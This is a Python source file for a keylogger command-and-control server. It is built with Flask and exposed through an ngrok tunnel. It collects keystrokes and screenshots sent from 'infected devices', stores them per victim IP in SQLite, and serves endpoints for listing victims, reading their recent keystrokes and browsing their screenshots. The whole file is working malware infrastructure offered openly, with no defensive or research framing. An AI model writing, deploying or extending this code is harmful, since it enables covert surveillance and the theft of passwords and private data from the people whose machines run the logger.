from flask import Flask, request, jsonify
import os
import threading
import logging
from pyngrok import ngrok
import json
from datetime import datetime, timedelta
import time
import sqlite3
from pathlib import Path
import hashlib

class KeyloggerServer:
    def __init__(self):
        self.app = Flask(__name__)
        self.base_path = Path("infected_devices")
        self.base_path.mkdir(exist_ok=True)
        self.db_path = self.base_path / "devices.db"
        self.lock = threading.Lock()
        self.setup_database()
        self.setup_routes()
        
    def setup_database(self):
        with sqlite3.connect(self.db_path) as conn:
            conn.execute('''
                CREATE TABLE IF NOT EXISTS devices (
                    id TEXT PRIMARY KEY,
                    ip TEXT UNIQUE,
                    name TEXT,
                    first_seen TEXT,
                    last_seen TEXT,
                    screenshot_count INTEGER DEFAULT 0,
                    keystroke_count INTEGER DEFAULT 0,
                    active BOOLEAN DEFAULT 1
                )
            ''')
            conn.execute('''
                CREATE TABLE IF NOT EXISTS keystrokes (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    device_id TEXT,
                    timestamp TEXT,
                    data TEXT,
                    FOREIGN KEY (device_id) REFERENCES devices (id)
                )
            ''')
            conn.execute('''
                CREATE TABLE IF NOT EXISTS screenshots (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    device_id TEXT,
                    timestamp TEXT,
                    filename TEXT,
                    FOREIGN KEY (device_id) REFERENCES devices (id)
                )
            ''')
    
    def setup_routes(self):
        self.app.route('/', methods=['POST'])(self.receive_keystrokes)
        self.app.route('/screenshot', methods=['POST'])(self.receive_screenshot)
        self.app.route('/devices', methods=['GET'])(self.get_devices)
        self.app.route('/device/<device_id>', methods=['GET'])(self.get_device_data)
        self.app.route('/screenshots/<device_id>', methods=['GET'])(self.get_device_screenshots)
    
    def get_device_id(self, ip):
        return hashlib.md5(ip.encode()).hexdigest()
    
    def update_device_activity(self, ip, name=None):
        device_id = self.get_device_id(ip)
        with sqlite3.connect(self.db_path) as conn:
            now = datetime.now().isoformat()
            
            # Check if device exists
            cursor = conn.execute('SELECT id FROM devices WHERE id = ?', (device_id,))
            if cursor.fetchone():
                conn.execute(
                    'UPDATE devices SET last_seen = ?, active = 1 WHERE id = ?',
                    (now, device_id)
                )
            else:
                conn.execute(
                    'INSERT INTO devices (id, ip, name, first_seen, last_seen) VALUES (?, ?, ?, ?, ?)',
                    (device_id, ip, name or f"Device_{ip}", now, now)
                )
            
            conn.commit()
    
    def receive_keystrokes(self):
        ip = request.remote_addr
        device_id = self.get_device_id(ip)
        self.update_device_activity(ip)
        
        data = request.get_json()
        keystrokes = data.get('keystrokes', '')
        
        if keystrokes:
            with sqlite3.connect(self.db_path) as conn:
                conn.execute(
                    'INSERT INTO keystrokes (device_id, timestamp, data) VALUES (?, ?, ?)',
                    (device_id, datetime.now().isoformat(), keystrokes)
                )
                # Update keystroke count
                conn.execute(
                    'UPDATE devices SET keystroke_count = keystroke_count + ? WHERE id = ?',
                    (len(keystrokes), device_id)
                )
                conn.commit()
        
        logging.info(f"Keystrokes from {ip}: {len(keystrokes)} chars")
        return {"status": "success"}
    
    def receive_screenshot(self):
        ip = request.remote_addr
        device_id = self.get_device_id(ip)
        self.update_device_activity(ip)
        
        if 'file' not in request.files:
            return {"status": "error", "message": "No file uploaded"}, 400
        
        file = request.files['file']
        if not file.filename.lower().endswith('.png'):
            return {"status": "error", "message": "Invalid file type"}, 400
        
        # Create device-specific folder
        device_folder = self.base_path / device_id / "screenshots"
        device_folder.mkdir(parents=True, exist_ok=True)
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"screenshot_{timestamp}.png"
        filepath = device_folder / filename
        file.save(filepath)
        
        with sqlite3.connect(self.db_path) as conn:
            conn.execute(
                'INSERT INTO screenshots (device_id, timestamp, filename) VALUES (?, ?, ?)',
                (device_id, datetime.now().isoformat(), str(filepath))
            )
            conn.execute(
                'UPDATE devices SET screenshot_count = screenshot_count + 1 WHERE id = ?',
                (device_id,)
            )
            conn.commit()
        
        logging.info(f"Screenshot from {ip}: {filename}")
        return {"status": "success"}
    
    def get_devices(self):
        with sqlite3.connect(self.db_path) as conn:
            cursor = conn.execute('''
                SELECT id, ip, name, first_seen, last_seen, 
                       screenshot_count, keystroke_count, active
                FROM devices 
                ORDER BY last_seen DESC
            ''')
            devices = []
            for row in cursor.fetchall():
                last_seen = datetime.fromisoformat(row[4])
                active = datetime.now() - last_seen < timedelta(minutes=5)
                if not active:
                    conn.execute('UPDATE devices SET active = 0 WHERE id = ?', (row[0],))
                
                devices.append({
                    'id': row[0],
                    'ip': row[1],
                    'name': row[2],
                    'first_seen': row[3],
                    'last_seen': row[4],
                    'screenshot_count': row[5],
                    'keystroke_count': row[6],
                    'active': active
                })
            conn.commit()
            return jsonify(devices)
    
    def get_device_data(self, device_id):
        with sqlite3.connect(self.db_path) as conn:
            # Get device info
            device = conn.execute(
                'SELECT * FROM devices WHERE id = ?', (device_id,)
            ).fetchone()
            
            if not device:
                return jsonify({"error": "Device not found"}), 404
            
            # Get recent keystrokes
            keystrokes = conn.execute('''
                SELECT timestamp, data FROM keystrokes 
                WHERE device_id = ? 
                ORDER BY timestamp DESC 
                LIMIT 100
            ''', (device_id,)).fetchall()
            
            return jsonify({
                'device': {
                    'id': device[0],
                    'ip': device[1],
                    'name': device[2],
                    'first_seen': device[3],
                    'last_seen': device[4],
                    'screenshot_count': device[5],
                    'keystroke_count': device[6],
                    'active': bool(device[7])
                },
                'recent_keystrokes': [
                    {'timestamp': k[0], 'data': k[1]} for k in keystrokes
                ]
            })
    
    def get_device_screenshots(self, device_id):
        device_folder = self.base_path / device_id / "screenshots"
        if not device_folder.exists():
            return jsonify([])
        
        screenshots = []
        for file in device_folder.glob("*.png"):
            screenshots.append({
                'filename': file.name,
                'path': str(file),
                'size': file.stat().st_size,
                'modified': datetime.fromtimestamp(file.stat().st_mtime).isoformat()
            })
        
        return jsonify(sorted(screenshots, key=lambda x: x['modified'], reverse=True))

def start_ngrok_tunnel(port):
    """Start ngrok tunnel and return public URL"""
    try:
        # Kill existing tunnels
        ngrok.kill()
        time.sleep(2)
        
        # Create new tunnel
        public_url = ngrok.connect(port, bind_tls=True)
        ngrok_url = public_url.public_url
        
        print(f"✅ Ngrok tunnel created: {ngrok_url}")
        return ngrok_url
    except Exception as e:
        print(f"❌ Ngrok error: {e}")
        return None

def main():
    # Setup logging
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(levelname)s - %(message)s',
        handlers=[
            logging.FileHandler('keylogger_server.log'),
            logging.StreamHandler()
        ]
    )
    
    print("🚀 Starting Keylogger Server...")
    
    # Initialize server
    server = KeyloggerServer()
    port = 56860
    
    # Start ngrok tunnel
    public_url = start_ngrok_tunnel(port)
    if not public_url:
        print("❌ Failed to create ngrok tunnel")
        return
    
    # Save URL for logger
    with open("server_url.txt", "w") as f:
        f.write(public_url)
    
    print(f"🌐 Server URL: {public_url}")
    print("📱 Waiting for connections...")
    print("\nAvailable endpoints:")
    print("  GET /devices - List all devices")
    print("  GET /device/<device_id> - Get device details")
    print("  GET /screenshots/<device_id> - List device screenshots")
    
    # Disable Flask verbose logging
    import flask
    flask.cli.show_server_banner = lambda *args: None
    logging.getLogger('werkzeug').setLevel(logging.WARNING)
    
    server.app.run(host='0.0.0.0', port=port, debug=False)

if __name__ == "__main__":
    main()